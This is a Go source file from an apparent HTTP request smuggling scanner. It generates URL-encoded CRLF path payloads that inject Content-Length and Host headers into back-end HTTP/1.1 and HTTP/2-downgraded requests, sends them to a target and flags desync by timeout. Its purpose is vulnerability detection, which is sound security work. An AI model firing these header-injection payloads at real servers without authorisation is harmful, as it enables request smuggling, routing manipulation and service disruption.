package scan

// pathcrlfinject.go — Path CRLF injection desync (H1 and H2)
//
// Technique: send a request whose URL path contains URL-encoded CRLF sequences.
// If the front-end proxy decodes the path before forwarding to the back-end,
// the decoded CRLF characters inject additional headers into the H1 request,
// including a large Content-Length that causes the back-end to hang waiting
// for a body that never arrives → TIMEOUT.
//
// Example raw H1 request (single-encoded):
//
//   GET /#%20HTTP%2f1%2e1%0d%0aContent-Length:%20100%0d%0aFoo:%20x HTTP/1.1
//   Host: target
//   Connection: close
//
// If the proxy URL-decodes the path and forwards verbatim, the back-end sees:
//
//   GET /# HTTP/1.1
//   Content-Length: 100
//   Foo: x HTTP/1.1      ← "Foo: x" absorbs the trailing " HTTP/1.1" suffix
//   Host: target
//   Connection: close
//
//   (back-end waits for 100 bytes → timeout)
//
// Variants:
//   - hash/nohash: path starts with "#" or not
//   - body: path embeds "XX" after double-CRLF (2 bytes, CL=100 → still hangs)
//   - host: also injects a Host header override
//   - single/double URL-encoding of CRLF (%0d%0a vs %250d%250a)
//
// Both H1 (plain TCP request) and H2 (:path pseudo-header) are tested.
// Detection is timeout-based, with confirmation.

import (
	"fmt"
	"net/url"
	"time"

	"github.com/smuggled/smuggled/internal/config"
	"github.com/smuggled/smuggled/internal/report"
	"github.com/smuggled/smuggled/internal/request"
)

const pathCRLFInjectCL = 100 // injected Content-Length — large to guarantee timeout

// pathCRLFVariant describes one path-injection payload.
type pathCRLFVariant struct {
	name   string
	suffix string // appended to the base path (already URL-encoded)
}

// buildPathCRLFVariants returns all variants for the given base path.
// crlf values: single = "%0d%0a", double = "%250d%250a"
func buildPathCRLFVariants(basePath string) []pathCRLFVariant {
	cl := fmt.Sprintf("%d", pathCRLFInjectCL)

	var out []pathCRLFVariant
	for _, enc := range []struct{ label, crlf string }{
		{"single", "%0d%0a"},
		{"double", "%250d%250a"},
	} {
		crlf := enc.crlf
		label := enc.label

		// A: hash prefix, no body bytes in path
		out = append(out, pathCRLFVariant{
			name:   "hash-" + label,
			suffix: "#%20HTTP%2f1%2e1" + crlf + "Content-Length:%20" + cl + crlf + "Foo:%20x",
		})

		// B: no hash prefix
		out = append(out, pathCRLFVariant{
			name:   "nohash-" + label,
			suffix: "%20HTTP%2f1%2e1" + crlf + "Content-Length:%20" + cl + crlf + "Foo:%20x",
		})

		// C: hash + body bytes embedded in path (XX = 2 bytes, CL=100 → backend waits for 98 more)
		out = append(out, pathCRLFVariant{
			name:   "hash-body-" + label,
			suffix: "#%20HTTP%2f1%2e1" + crlf + "Content-Length:%20" + cl + crlf + crlf + "XX",
		})

		// D: hash + injected Host override (may affect routing / virtual hosting)
		out = append(out, pathCRLFVariant{
			name: "hash-host-" + label,
			suffix: "#%20HTTP%2f1%2e1" + crlf +
				"Host:%20injected.invalid" + crlf +
				"Content-Length:%20" + cl + crlf +
				"Foo:%20x",
		})

	}

	// E: LF-only variants (bare \n — some servers treat \n as line ending)
	for _, enc := range []struct{ label, lf string }{
		{"single", "%0a"},
		{"double", "%250a"},
	} {
		out = append(out, pathCRLFVariant{
			name:   "hash-lf-" + enc.label,
			suffix: "#%20HTTP%2f1%2e1" + enc.lf + "Content-Length:%20" + cl + enc.lf + "Foo:%20x",
		})
	}
	return out
}

// ScanPathCRLFInject tests path-based CRLF injection on both H1 and H2.
func ScanPathCRLFInject(target *url.URL, base []byte, cfg config.Config, rep *report.Reporter) {
	cfg = cfg.WithDebugScope("PathCRLF")

	path := target.RequestURI()
	if path == "" {
		path = "/"
	}
	host := target.Hostname()
	if p := target.Port(); p != "" {
		host = host + ":" + p
	}

	timeoutThreshold := time.Duration(float64(cfg.Timeout) * request.TimeoutRatio)
	variants := buildPathCRLFVariants(path)

	// ── H1 probes ────────────────────────────────────────────────────────────
	rep.Log("PathCRLF: starting H1 probes on %s", host)
	for _, v := range variants {
		injectedPath := path + v.suffix
		label := "H1/" + v.name

		if !techniqueEnabled("PathCRLF/"+label, cfg) {
			continue
		}

		// Build raw H1 request — bypass any URL normalisation in stdlib
		rawReq := []byte("GET " + injectedPath + " HTTP/1.1\r\n" +
			"Host: " + host + "\r\n" +
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n" +
			"Connection: close\r\n" +
			"\r\n")

		rep.Log("PathCRLF [%s]: probe target=%s", label, host)
		dbg(cfg, "[%s]: path=%s", label, injectedPath)

		_, elapsed, timedOut, err := request.RawRequest(target, rawReq, cfg)
		delayed := cfg.IsDelayed(elapsed)

		dbg(cfg, "[%s]: elapsed=%v timedOut=%v delayed=%v err=%v", label, elapsed, timedOut, delayed, err)

		if err != nil || (!timedOut && !delayed) {
			continue
		}

		// Confirm: clean request should NOT time out
		_, cleanElapsed, cleanTimeout, _ := request.RawRequest(target, base, cfg)
		if cleanTimeout || cleanElapsed >= timeoutThreshold {
			dbg(cfg, "[%s]: clean request also timed out — server overloaded, skipping", label)
			continue
		}

		sev := report.SeverityProbable
		if request.ConfirmProbe(target, rawReq, cfg, rep.Log, "PathCRLF/"+label) {
			sev = report.SeverityConfirmed
		}

		rep.Emit(report.Finding{
			Target:    target.String(),
			Method:    config.EffectiveMethods(cfg)[0],
			Severity:  sev,
			Type:      "path-crlf",
			Technique: label,
			Description: fmt.Sprintf(
				"Path CRLF injection (H1): URL-encoded CRLF in path (%s encoding) injected "+
					"'Content-Length: %d' into the back-end H1 request. "+
					"Back-end timed out waiting for %d body bytes that were never sent. "+
					"The front-end proxy decoded the path before forwarding.",
				v.name, pathCRLFInjectCL, pathCRLFInjectCL),
			Evidence:  fmt.Sprintf("elapsed=%v confirmed=%v injected_cl=%d", elapsed, sev == report.SeverityConfirmed, pathCRLFInjectCL),
			RawProbe:  request.Truncate(string(rawReq), 512),
		})
		rep.Log("PathCRLF [!] H1/%s on %s", v.name, target.String())

		if cfg.ExitOnFind {
			return
		}
	}

	// ── H2 probes ────────────────────────────────────────────────────────────
	if target.Scheme != "https" {
		return
	}
	if !request.ProbeH2(target, cfg) {
		dbg(cfg, "H2 not available, skipping H2 path-crlf probes")
		return
	}

	h2host := target.Hostname()
	rep.Log("PathCRLF: starting H2 probes on %s", h2host)

	for _, v := range variants {
		injectedPath := path + v.suffix
		label := "H2/" + v.name

		if !techniqueEnabled("PathCRLF/"+label, cfg) {
			continue
		}

		rep.Log("PathCRLF [%s]: probe target=%s", label, h2host)
		dbg(cfg, "[%s]: :path=%s", label, injectedPath)

		extra := map[string]string{":path": injectedPath}
		start := time.Now()
		resp, err := h2RawRequest(target, "GET", path, h2host, "", extra, cfg)
		elapsed := time.Since(start)

		delayed := cfg.IsDelayed(elapsed)
		timedOut := elapsed >= timeoutThreshold && (resp == nil || resp.Status == 0)

		dbg(cfg, "[%s]: elapsed=%v timedOut=%v delayed=%v err=%v", label, elapsed, timedOut, delayed, err)

		if err != nil || (!timedOut && !delayed) {
			continue
		}

		// Confirm: clean H2 request should respond fast
		cleanStart := time.Now()
		cleanResp, cleanErr := h2RawRequest(target, "GET", path, h2host, "", nil, cfg)
		cleanElapsed := time.Since(cleanStart)
		if cleanErr != nil || cleanElapsed >= timeoutThreshold || (cleanResp != nil && cleanResp.Status == 0) {
			dbg(cfg, "[%s]: clean H2 also failed — not path-specific, skipping", label)
			continue
		}

		// Repeat attack to confirm
		sev := report.SeverityProbable
		hits := 0
		for i := 0; i < cfg.ConfirmReps; i++ {
			cs := time.Now()
			cr, ce := h2RawRequest(target, "GET", path, h2host, "", extra, cfg)
			ce2 := time.Since(cs)
			if ce != nil || ce2 >= timeoutThreshold || (cr != nil && cr.Status == 0) {
				hits++
			}
		}
		if hits >= cfg.ConfirmReps {
			sev = report.SeverityConfirmed
		}
		dbg(cfg, "[%s]: confirmation hits=%d/%d", label, hits, cfg.ConfirmReps)

		rawProbe := fmt.Sprintf("GET %s HTTP/2\r\nHost: %s\r\n:path: %s\r\n\r\n",
			path, h2host, injectedPath)

		rep.Emit(report.Finding{
			Target:    target.String(),
			Method:    "HTTP/2",
			Severity:  sev,
			Type:      "path-crlf",
			Technique: label,
			Description: fmt.Sprintf(
				"Path CRLF injection (H2): URL-encoded CRLF in :path pseudo-header (%s encoding) "+
					"injected 'Content-Length: %d' into the downgraded H1 request. "+
					"Back-end timed out waiting for %d body bytes. "+
					"The H2 front-end forwarded the :path value verbatim during H2→H1 downgrade.",
				v.name, pathCRLFInjectCL, pathCRLFInjectCL),
			Evidence:  fmt.Sprintf("elapsed=%v confirmed=%v injected_cl=%d", elapsed, sev == report.SeverityConfirmed, pathCRLFInjectCL),
			RawProbe:  rawProbe,
		})
		rep.Log("PathCRLF [!] H2/%s on %s", v.name, target.String())

		if cfg.ExitOnFind {
			return
		}
	}
}
